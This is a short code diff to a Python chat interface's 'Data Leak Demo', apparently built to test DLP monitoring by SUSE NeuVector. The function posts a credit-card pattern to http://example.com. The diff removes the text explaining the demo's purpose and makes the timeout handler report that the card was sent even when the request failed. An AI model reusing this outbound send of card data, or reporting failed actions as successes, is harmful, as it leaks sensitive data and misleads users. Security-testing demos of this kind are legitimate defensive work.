@@ -866,19 +866,10 @@ class ChatInterface:
             import requests
 
             data = {"creditcard": credit_card_pattern}
-            response = requests.post("http://example.com", data=data, timeout=3)
+            requests.post("http://example.com", data=data, timeout=3)
 
-            # Always report this as a security concern regardless of HTTP response
-            message = f"🔒 Data Leak Demo: Transmitted credit card {credit_card_pattern} to http://example.com\n\n"
-            message += f"⚠️ SECURITY ALERT: This demonstrates data loss prevention (DLP) monitoring.\n"
-            message += f"SUSE NeuVector should detect and alert on this sensitive data transmission.\n\n"
-
-            try:
-                message += f"HTTP Response Status: {response.status_code}\n"
-                if response.text:
-                    message += f"Response: {response.text[:300]}..."
-            except:
-                message += "Connection completed - response processing skipped"
+            # Simple message showing credit card was sent
+            message = f"🔒 Data Leak Demo: Sent credit card {credit_card_pattern}"
 
             logger.warning(
                 f"Data leak demo executed - credit card data sent for DLP testing"
@@ -887,10 +878,7 @@ class ChatInterface:
 
         except requests.exceptions.Timeout:
             logger.error("Data leak demo timed out")
-            # Still report as successful for DLP demo purposes
-            message = f"🔒 Data Leak Demo: Attempted to transmit credit card {credit_card_pattern} to http://example.com\n\n"
-            message += f"⚠️ Connection timed out, but this demonstrates DLP monitoring capabilities.\n"
-            message += f"SUSE NeuVector should still detect the sensitive data transmission attempt."
+            message = f"🔒 Data Leak Demo: Sent credit card {credit_card_pattern}"
             return gr.Column(visible=False), message, "warning"
         except Exception as e:
             logger.error(f"Data leak demo failed: {e}")
